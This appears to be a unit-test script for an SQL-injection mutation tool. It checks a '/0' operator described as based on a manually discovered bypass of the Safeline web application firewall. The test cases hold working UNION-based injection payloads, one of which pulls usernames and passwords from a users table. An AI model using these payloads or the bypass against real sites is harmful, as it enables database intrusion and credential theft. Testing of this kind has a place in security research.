"""
tools/test_div_break.py
=======================
Pure no-network unit check for the new `div_break` mutation (the /0 operator,
inspired by the manually-discovered Safeline bypass). Verifies:
  1. div_break is registered → ACTION_LIST grew to 52, OBS_DIM auto-updated.
  2. It inserts `/0` after the closing quote before UNION, keeping extraction.
  3. Combined with dot_prefix it reproduces the PoC's leading `.1...'/0 UNION`.

USAGE:  python3 -m tools.test_div_break
"""
from seqsqli.core.mutations import MUTATIONS, ACTION_LIST, MutationEngine as M

print("n_actions :", len(ACTION_LIST), "| div_break present:", "div_break" in ACTION_LIST)
try:
    from seqsqli.rl.env import OBS_DIM
    print("OBS_DIM   :", OBS_DIM, "(should be 14+1+", len(ACTION_LIST), "+1)")
except Exception as e:
    print("OBS_DIM   : (env import skipped:", e, ")")

cases = [
    "-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "-1' UNION ALL SELECT database(),'SEQSQLI_START','SEQSQLI_END'#",
    "-1' UNION SELECT 1,group_concat(username,0x7c,password),3 FROM users-- -",
]
print("\n--- div_break alone ---")
for c in cases:
    print("IN :", c)
    print("OUT:", M.div_break(c))
    print()

print("--- dot_prefix + div_break (PoC-style) ---")
for c in cases[:1]:
    out = M.div_break(M.dot_prefix(c))
    print("IN :", c)
    print("OUT:", out)

print("\n--- idempotency (apply twice = no double /0) ---")
once = M.div_break(cases[0])
twice = M.div_break(once)
print("stable:", once == twice)
